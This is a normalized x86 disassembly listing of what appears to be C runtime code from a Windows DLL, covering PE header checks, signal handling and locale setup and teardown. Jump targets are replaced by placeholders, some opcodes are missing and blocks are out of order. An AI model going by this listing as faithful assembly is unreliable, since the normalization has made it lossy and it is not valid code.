pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_10034124
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10031551
mov edi edi
push esi
push edi
xor edi edi
lea esi [ edi + rw-data ]
push [ esi ]
call sub_1002baad
add edi 0x4
pop ecx
mov [ esi ] eax
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_10031580
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_100315c0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
jbe r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10031610
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_1002caa0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_10031580
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_100315c0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10031719
push 0x8
push r--data
call sub_1002ca38
push [ rw-data ]
call sub_1002bb28
pop ecx
test eax eax
je r-xdata
call sub_100316cd
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_10031780
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_100317c4
push 0x20
push r--data
call sub_1002ca38
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_1002bcfb
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_1002ca7d
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_10031780
mov esi eax
add esi 0x8
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_10027d5e
mov [ ebp - 0x1c ] 0x1
push eax
call sub_1002bb28
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_1002972b
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1002480c
add esp 0x14
jmp r-xdata
mov [ ebp - 0x20 ] eax
pop ecx
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_1002d1b0
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_1002bb1f
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10031938
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
add ecx edx
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_10031992
push 0x10
push r--data
call sub_1002ca38
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_1002ca7d
retn
sub_10031a00
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_10037268
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_10037268
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_10031a4c
push 0x10
push r--data
call sub_1002ca38
xor eax eax
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
setne al
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_1002972b
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_1002480c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x4
call sub_1002d1b0
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_1002d1e3
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
call sub_1002ca7d
retn
mov esi [ ebp - 0x1c ]
mov esi [ ebx - 0x4 ]
sub esi 0x9
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10031ae6
cmp [ ebp - 0x20 ] edi
jne r-xdata
sub_10031aef
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
movzx ecx [ eax + 0x42 ]
movzx edx [ eax + 0x44 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
test esi esi
jne r-xdata
and [ ebp - 0xc ] 0x0
push ebx
push edi
mov [ ebp - 0x10 ] eax
lea eax [ esi + 0x4 ]
push eax
push 0x31
push ecx
xor ebx ebx
inc ebx
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
mov edi eax
lea eax [ esi + 0x8 ]
push eax
push 0x32
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0xc ]
push eax
push 0x33
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0x10 ]
push eax
push 0x34
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
add esp 0x50
or edi eax
lea eax [ esi + 0x14 ]
push eax
push 0x35
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0x18 ]
push eax
push 0x36
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
push esi
push 0x37
push [ ebp - 0x4 ]
or edi eax
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0x20 ]
push eax
push 0x2a
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
add esp 0x50
or edi eax
lea eax [ esi + 0x24 ]
push eax
push 0x2b
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0x28 ]
push eax
push 0x2c
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0x2c ]
push eax
push 0x2d
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0x30 ]
push eax
push 0x2e
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
add esp 0x50
or edi eax
lea eax [ esi + 0x34 ]
push eax
push 0x2f
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0x1c ]
push eax
push 0x30
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0x38 ]
push eax
push 0x44
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0x3c ]
push eax
push 0x45
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
add esp 0x50
or edi eax
lea eax [ esi + 0x40 ]
push eax
push 0x46
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0x44 ]
push eax
push 0x47
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0x48 ]
push eax
push 0x48
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0x4c ]
push eax
push 0x49
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
add esp 0x50
or edi eax
lea eax [ esi + 0x50 ]
push eax
push 0x4a
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0x54 ]
push eax
push 0x4b
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0x58 ]
push eax
push 0x4c
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0x5c ]
push eax
push 0x4d
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
add esp 0x50
or edi eax
lea eax [ esi + 0x60 ]
push eax
push 0x4e
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0x64 ]
push eax
push 0x4f
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0x68 ]
push eax
push 0x38
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0x6c ]
push eax
push 0x39
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
add esp 0x50
or edi eax
lea eax [ esi + 0x70 ]
push eax
push 0x3a
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0x74 ]
push eax
push 0x3b
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0x78 ]
push eax
push 0x3c
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0x7c ]
push eax
push 0x3d
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
add esp 0x50
or edi eax
lea eax [ esi + 0x80 ]
push eax
push 0x3e
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0x84 ]
push eax
push 0x3f
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0x88 ]
push eax
push 0x40
push [ ebp - 0x4 ]
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0x8c ]
push eax
push 0x41
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
add esp 0x50
or edi eax
lea eax [ esi + 0x90 ]
push eax
push 0x42
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0x94 ]
push eax
push 0x43
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0x98 ]
push eax
push 0x28
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0x9c ]
push eax
push 0x29
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
add esp 0x50
or edi eax
lea eax [ esi + 0xa0 ]
push eax
push 0x1f
push [ ebp - 0x8 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0xa4 ]
push eax
push 0x20
push [ ebp - 0x8 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0xa8 ]
push eax
push 0x1003
push [ ebp - 0x8 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1002cea6
or edi eax
lea eax [ esi + 0xb0 ]
push eax
push 0x1009
mov ebx [ ebp - 0x8 ]
push ebx
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1002cea6
add esp 0x50
or edi eax
mov eax edi
pop edi
mov [ esi + 0xac ] ebx
pop ebx
leave
retn
or eax 0xffffffff
leave
retn
sub_10031f0a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_10024aba
push [ esi + 0x8 ]
call sub_10024aba
push [ esi + 0xc ]
call sub_10024aba
push [ esi + 0x10 ]
call sub_10024aba
push [ esi + 0x14 ]
call sub_10024aba
push [ esi + 0x18 ]
call sub_10024aba
push [ esi ]
call sub_10024aba
push [ esi + 0x20 ]
call sub_10024aba
push [ esi + 0x24 ]
call sub_10024aba
push [ esi + 0x28 ]
call sub_10024aba
push [ esi + 0x2c ]
call sub_10024aba
push [ esi + 0x30 ]
call sub_10024aba
push [ esi + 0x34 ]
call sub_10024aba
push [ esi + 0x1c ]
call sub_10024aba
push [ esi + 0x38 ]
call sub_10024aba
push [ esi + 0x3c ]
call sub_10024aba
add esp 0x40
push [ esi + 0x40 ]
call sub_10024aba
push [ esi + 0x44 ]
call sub_10024aba
push [ esi + 0x48 ]
call sub_10024aba
push [ esi + 0x4c ]
call sub_10024aba
push [ esi + 0x50 ]
call sub_10024aba
push [ esi + 0x54 ]
call sub_10024aba
push [ esi + 0x58 ]
call sub_10024aba
push [ esi + 0x5c ]
call sub_10024aba
push [ esi + 0x60 ]
call sub_10024aba
push [ esi + 0x64 ]
call sub_10024aba
push [ esi + 0x68 ]
call sub_10024aba
push [ esi + 0x6c ]
call sub_10024aba
push [ esi + 0x70 ]
call sub_10024aba
push [ esi + 0x74 ]
call sub_10024aba
push [ esi + 0x78 ]
call sub_10024aba
push [ esi + 0x7c ]
call sub_10024aba
add esp 0x40
push [ esi + 0x80 ]
call sub_10024aba
push [ esi + 0x84 ]
call sub_10024aba
push [ esi + 0x88 ]
call sub_10024aba
push [ esi + 0x8c ]
call sub_10024aba
push [ esi + 0x90 ]
call sub_10024aba
push [ esi + 0x94 ]
call sub_10024aba
push [ esi + 0x98 ]
call sub_10024aba
push [ esi + 0x9c ]
call sub_10024aba
push [ esi + 0xa0 ]
call sub_10024aba
push [ esi + 0xa4 ]
call sub_10024aba
push [ esi + 0xa8 ]
call sub_10024aba
add esp 0x2c
sub_1003209f
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x20 ] 0x0
mov ebx rw-data
je r-xdata
mov esi ebx
push 0xb8
push 0x1
call sub_1002a045
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
mov [ edi ] esi
xor eax eax
add eax 0xb4
push eax
call [ InterlockedDecrement@IAT ]
mov eax edi
call sub_10031aef
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ esi + 0xb4 ] 0x1
jmp r-xdata
push esi
call sub_10031f0a
push esi
call sub_10024aba
pop ecx
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
add edi 0xd4
mov eax [ edi ]
cmp eax ebx
je r-xdata
sub_10032118
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10024aba
pop ecx
mov esi [ esi + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_10024aba
pop ecx
push esi
call sub_10024aba
pop ecx
sub_1003215d
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
push edi
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] esi
cmp [ ebx + 0x1c ] esi
jne r-xdata
push 0x30
push 0x1
call sub_1002a045
mov edi eax
pop ecx
pop ecx
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
cmp [ ebx + 0x18 ] esi
jne r-xdata
mov esi [ ebx + 0xbc ]
push 0xc
pop ecx
push 0x4
[ edi ] [ esi ]
call sub_1002a000
xor esi esi
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax esi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] esi
mov [ ebp + 0x8 ] rw-data
jmp r-xdata
mov [ eax ] esi
cmp [ ebx + 0x1c ] esi
je r-xdata
push [ ebp + 0x8 ]
call sub_10024aba
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx + 0xb4 ]
mov esi [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ rw-data ]
mov [ eax + 0x4 ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] esi
mov [ eax + 0x8 ] ecx
push 0x4
call sub_1002a000
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
jne r-xdata
mov eax [ ebx + 0xb0 ]
test eax eax
je r-xdata
push eax
call esi
mov [ eax ] ecx
mov [ eax ] esi
mov esi [ ebp + 0x8 ]
movzx edi [ ebx + 0x3e ]
push esi
push 0xe
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_1002cea6
mov [ ebp - 0xc ] eax
lea eax [ esi + 0x4 ]
push eax
push 0xf
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_1002cea6
or [ ebp - 0xc ] eax
lea eax [ esi + 0x8 ]
push eax
push 0x10
push edi
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_1002cea6
add esp 0x3c
or eax [ ebp - 0xc ]
je r-xdata
xor esi esi
inc esi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xb4 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0xbc ] eax
xor eax eax
push eax
call esi
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
jmp r-xdata
push esi
call sub_10032118
pop ecx
or esi 0xffffffff
jmp r-xdata
push [ ebx + 0xb0 ]
call sub_10024aba
push [ ebx + 0xbc ]
call sub_10024aba
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
call sub_10024aba
push [ ebp - 0x8 ]
call sub_10024aba
pop ecx
pop ecx
mov eax esi
jmp r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp - 0x8 ]
xor ecx ecx
inc ecx
mov [ eax ] ecx
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
lea edi [ esi + 0x1 ]
mov cl [ edi ]
mov [ esi ] cl
mov esi edi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_10032327
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10024aba
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10024aba
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10024aba
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10024aba
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10024aba
pop ecx
mov esi [ esi + 0x24 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_10024aba
pop ecx
push esi
call sub_10024aba
pop ecx
sub_100323b5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x18 ] edi
jne r-xdata
push 0x30
push 0x1
call sub_1002a045
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x4
call sub_1002a000
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rw-data
jmp r-xdata
mov [ eax ] edi
cmp [ esi + 0x18 ] edi
je r-xdata
push ebx
call sub_10024aba
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb8 ]
cmp eax edi
je r-xdata
push 0xc
pop ecx
mov esi rw-data
mov edi ebx
[ edi ] [ esi ]
push 0x4
call sub_1002a000
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax edi
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x38 ]
lea eax [ ebx + 0xc ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1002cea6
mov edi eax
lea eax [ ebx + 0x10 ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1002cea6
or edi eax
lea eax [ ebx + 0x14 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1002cea6
or edi eax
lea eax [ ebx + 0x18 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1002cea6
add esp 0x50
or edi eax
lea eax [ ebx + 0x1c ]
push eax
push 0x18
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1002cea6
or edi eax
lea eax [ ebx + 0x20 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1002cea6
or edi eax
lea eax [ ebx + 0x24 ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1002cea6
or edi eax
lea eax [ ebx + 0x28 ]
push eax
push 0x1a
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1002cea6
add esp 0x50
or edi eax
lea eax [ ebx + 0x29 ]
push eax
push 0x19
push esi
push 0x0
lea eax [ ebp - 0x10 ]
push eax
call sub_1002cea6
or edi eax
lea eax [ ebx + 0x2a ]
push eax
push 0x54
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1002cea6
or edi eax
lea eax [ ebx + 0x2b ]
push eax
push 0x55
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1002cea6
or edi eax
lea eax [ ebx + 0x2c ]
push eax
push 0x56
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1002cea6
add esp 0x50
or edi eax
lea eax [ ebx + 0x2d ]
push eax
push 0x57
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1002cea6
or edi eax
lea eax [ ebx + 0x2e ]
push eax
push 0x52
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1002cea6
or edi eax
lea eax [ ebx + 0x2f ]
push eax
push 0x53
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1002cea6
add esp 0x3c
or eax edi
je r-xdata
push ebx
call sub_10024aba
push [ ebp - 0x8 ]
call sub_10024aba
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb8 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
push ebx
call sub_10032327
push ebx
call sub_10024aba
push [ ebp - 0x8 ]
call sub_10024aba
push [ ebp - 0x4 ]
call sub_10024aba
add esp 0x10
jmp r-xdata
pop ecx
jmp r-xdata
push [ esi + 0xbc ]
call sub_10024aba
push [ esi + 0xb0 ]
call sub_10024aba
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
